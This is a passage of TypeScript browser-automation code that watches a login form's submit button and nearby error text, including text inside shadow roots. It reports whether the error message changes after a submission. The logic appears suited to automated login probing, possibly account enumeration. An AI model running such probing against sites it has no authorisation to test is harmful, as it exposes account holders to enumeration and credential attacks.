            (window as unknown as AutomatiWindow).__hermesMutationTelemetry?.({
               type: 'submit_mutated',
               timestamp: Date.now(),
               initialDisabled,
               currentDisabled,
               initialHtmlLen: initialHtml.length,
               currentHtmlLen: currentHtml.length
            });
         }
       }

       if (hasMutated) {
         if (!currentDisabled && currentHtml === initialHtml) {
            checkResult();
         } else if (!currentDisabled && currentHtml.includes("Login")) {
            checkResult();
         }
       }
    });

    observer.observe(btn, { attributes: true, childList: true, subtree: true, characterData: true });

    const formObserver = new MutationObserver(() => {
        const newText = getErrorText();
        if (newText !== initialErrorText) {
            checkResult();
        }
    });

    const observeNodeAndShadows = (node: Node) => {
        formObserver.observe(node, { childList: true, subtree: true, characterData: true });
        if ((node as Element).shadowRoot) {
            observeNodeAndShadows((node as Element).shadowRoot as unknown as Node);
        }
        const walker = document.createTreeWalker(node, NodeFilter.SHOW_ELEMENT);
        let child = walker.nextNode();
        while (child) {
            if ((child as Element).shadowRoot) {
                observeNodeAndShadows((child as Element).shadowRoot as unknown as Node);
            }
            child = walker.nextNode();
        }
    };

    const formArea = document.querySelector(eSel)?.closest('form') || document.body;
    observeNodeAndShadows(formArea);
    (window as unknown as AutomatiWindow).__automatiCleanupObservers = () => {
       observer.disconnect();
       formObserver.disconnect();
    };
  }, { sSel: submitSel, eSel: emailSel }).catch(() => {});
}

export async function waitForSubmitMutationResult(page: Page, timeoutMs = 2000): Promise<SubmitMutationResult | null> {
  try {
      const result = await page.waitForFunction(() => {
          return (window as unknown as AutomatiWindow).__automatiSubmitObserverResult;
      }, null, { timeout: timeoutMs }).catch(() => null);

      if (result) {
         const json = await result.jsonValue() as SubmitMutationResult;
         return json;
      }

      const finalState = await page.evaluate((eSel) => {
         if ((window as unknown as AutomatiWindow).__automatiCleanupObservers) (window as unknown as AutomatiWindow).__automatiCleanupObservers?.();

         const getDeepText = (root: Node): string => {
           let text = "";
           if (root.nodeType === Node.TEXT_NODE) return (root.textContent || "").trim();
           if (root.nodeType === Node.ELEMENT_NODE) {
             const tag = (root as Element).tagName.toLowerCase();
             if (tag === "script" || tag === "style" || tag === "noscript") return "";
             if ((root as Element).shadowRoot) text += " " + getDeepText((root as Element).shadowRoot as unknown as Node);
           }
           const childNodes = root.childNodes || [];
           for (let i = 0; i < childNodes.length; i++) {
             text += " " + getDeepText(childNodes[i]!);
           }
           return text;
         };

         const getErrorText = () => {
           const emailEl = document.querySelector(eSel);
           let target: Node = document.body;
           if (emailEl) {
             let parent = emailEl.parentElement;
             for (let i = 0; i < 4; i++) {
               if (parent && parent.parentElement) parent = parent.parentElement;
             }
             if (parent) target = parent;
           }
           try {
             return getDeepText(target).replace(/\s+/g, " ").trim().toLowerCase();
           } catch {
             return target.textContent ? target.textContent.toLowerCase() : "";
           }
         };
         const finalErrorText = getErrorText();
         const initialErrorText = (window as unknown as AutomatiWindow).__automatiErrorBaseline || "";

         return {
             mutated: false,
             baselineRestored: true,
             initialErrorText,
             finalErrorText,
             errorVaried: initialErrorText !== finalErrorText
         };
      }, 'input[type="email"], input[name*="user" i]').catch(() => null);

      return finalState;
  } catch (e) {
      return null;
  }
}